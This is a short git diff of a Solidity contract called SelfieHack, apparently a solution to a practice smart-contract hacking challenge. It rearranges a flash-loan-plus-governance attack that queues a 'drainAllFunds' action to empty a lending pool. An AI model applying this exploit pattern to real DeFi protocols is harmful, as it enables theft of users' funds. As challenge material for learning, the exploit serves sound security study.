@@ -32,14 +32,15 @@ contract SelfieHack {
     ) external returns (bytes32) {
         // pool.flashLoan(IERC3156FlashBorrower(_initiator), _token, _amount, _data);
 
-        actionId = governance.queueAction(
-            address(pool),
-            0,
-            abi.encodeWithSignature(
-                "drainAllFunds(address)",
-                address(msg.sender)
-            )
-        );
+        // actionId = governance.queueAction(
+        //     address(pool),
+        //     0,
+        //     abi.encodeWithSignature(
+        //         "drainAllFunds(address)",
+        //         address(msg.sender)
+        //     )
+        // );
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     function attack() external {
@@ -49,15 +50,15 @@ contract SelfieHack {
             token.balanceOf(address(pool)),
             bytes("0x")
         );
-        // // This will run after the snapshot
-        // actionId = governance.queueAction(
-        //     address(pool),
-        //     0,
-        //     abi.encodeWithSignature(
-        //         "drainAllFunds(address)",
-        //         address(msg.sender)
-        //     )
-        // );
+        // This will run after the snapshot
+        actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                address(msg.sender)
+            )
+        );
     }
 
     function attack2() external {
